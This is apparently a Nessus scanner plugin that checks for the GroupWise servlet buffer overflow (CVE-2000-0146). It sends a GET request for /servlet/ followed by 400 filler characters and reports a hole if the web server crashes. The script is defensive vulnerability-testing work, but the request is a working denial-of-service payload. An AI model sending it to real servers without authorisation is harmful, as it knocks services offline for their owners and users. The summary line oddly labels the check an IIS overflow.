#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Axel Nennker axel@nennker.de
# I got false positive from this script in revision 1.7
# Therefore I added an extra check before the attack and
# rephrased the description. 20020306

if(description)
{
 script_id(10097);
 script_bugtraq_id(972);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0146");
 name["english"] = "GroupWise buffer overflow";
 name["francais"] = "Dépassement de buffer dans GroupWise";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It is possible to make the remote web-server
crash by doing the request :

	GET /servlet/AAAA...AAAA
	

Risk factor : High
Solution :  If the server is a Groupwise server, then install GroupWise Enhancement Pack 5.5 Sp1";


 desc["francais"] = "
Il est possible de faire planter le serveur GroupWise distant
en faisant la requete :
	GET /servlet/AAAA..AAAA

Facteur de risque : Elevé
Solution : Installez GroupWise Enhancement Pack 5.5 Sp1";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "IIS buffer overflow";
 summary["francais"] = "Dépassement de buffer dans IIS";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "www_too_long_url.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

# if the server already crashes because of a too long
# url, go away

too_long = get_kb_item("www/too_long_url_crash");
if(too_long)exit(0);

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

# now try to crash the server
soc = http_open_socket(port);
if(!soc) exit(0);
data = string("/servlet/", crap(400));
data = http_get(item:data, port:port);
send(socket:soc, data:data);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port))security_hole(port);
